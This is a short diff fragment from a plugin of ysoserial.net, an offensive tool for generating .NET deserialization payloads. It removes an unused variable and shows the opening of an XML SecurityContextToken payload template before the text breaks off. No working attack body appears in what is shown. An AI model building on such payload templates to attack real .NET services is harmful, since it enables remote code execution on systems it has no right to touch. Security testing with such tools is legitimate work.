@@ -76,7 +76,7 @@ namespace ysoserial.Plugins
                 Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                 System.Environment.Exit(-1);
             }
-            String payloadValue = "";
+
             string payload = @"<SecurityContextToken xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc'>
 	<Identifier xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc'>
 		urn:unique-id:securitycontext:1
